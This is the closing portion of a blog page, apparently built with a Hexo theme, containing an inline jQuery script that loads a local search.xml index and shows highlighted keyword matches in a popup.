  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
<script type="text/javascript" src="/js/src/love.js"></script>
